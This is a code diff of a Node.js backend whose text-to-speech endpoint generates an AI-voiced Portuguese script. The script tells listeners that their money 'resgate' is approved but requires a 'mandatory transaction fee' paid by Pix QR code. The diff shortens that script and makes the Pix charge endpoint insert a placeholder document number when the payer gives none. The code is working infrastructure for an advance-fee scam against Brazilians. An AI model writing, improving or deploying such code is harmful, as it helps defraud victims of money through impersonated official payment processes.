@@ -588,13 +588,8 @@ app.post("/api/v1/tts", async (req, res) => {
     // Ajudar a IA a não ler "erre cifrão" e sim o valor.
     finalValueText = finalValueText.replace("R$", "reais");
   }
-
-  let script = "";
-  if (docType && docType.toUpperCase() === 'CNPJ') {
-    script = `Olá... É um grande prazer falar com você... Meu nome é ${atendente}, e eu sou a sua agente de atendimento... Informo que o processo de resgate da sua empresa, ${finalValueText}, foi aprovado com sucesso... Para que possamos liberar a transferência Pix, diretamente para a conta vinculada ao Banco Central... é necessário realizar o pagamento da tarifa transacional empresarial obrigatória... Este é um procedimento de segurança padrão exigido pelo sistema... Assim que o pagamento for compensado, o valor integral será creditado na conta em até dois minutos... Por favor... copie o código abaixo, ou escaneie o QR Code, para finalizar a liberação.`;
-  } else {
-    script = `Olá, ${firstName}... É um grande prazer falar com você... Meu nome é ${atendente}, e eu sou a sua agente de atendimento... Informo que o seu processo de resgate, ${finalValueText}, foi aprovado com sucesso... Para que possamos liberar a transferência Pix, diretamente para a sua conta vinculada ao Banco Central... é necessário realizar o pagamento da tarifa transacional obrigatória... Este é um procedimento de segurança padrão exigido pelo sistema... Assim que o pagamento for compensado, o valor integral será creditado em sua conta em até dois minutos... Por favor... copie o código abaixo, ou escaneie o QR Code, para finalizar a liberação.`;
-  }
+  const cleanValue = value ? value.replace('R$', '').trim() : "0";
+  const script = `Olá ${name}! Sou a atendente ${attendantName || "Assistente"} e identifiquei aqui no sistema que você tem ${cleanValue} reais liberados vinculados ao seu ${docType || "documento"}. O seu resgate já foi aprovado e o próximo passo é realizar o pagamento da tarifa transacional obrigatória para cobrir os custos operacionais da transação. Logo após a confirmação desse pagamento, o valor total será enviado para a sua conta.`;
 
   try {
     const apiKey = process.env.ELEVENLABS_API_KEY || "";
@@ -658,9 +653,12 @@ app.post("/api/v1/buypix/create", async (req, res) => {
        finalName += ' Brasileiro';
     }
 
+    const rawDoc = payer_document || "";
+    const cleanDoc = rawDoc.replace(/\D/g, '') || "00000000000";
+
     const payload = {
       amount: parseFloat(amount),
-      payer_document: payer_document.replace(/\D/g, ''),
+      payer_document: cleanDoc,
       payer_name: finalName,
       webhook_url: API_URL + '/api/v1/buypix/webhook'
     };
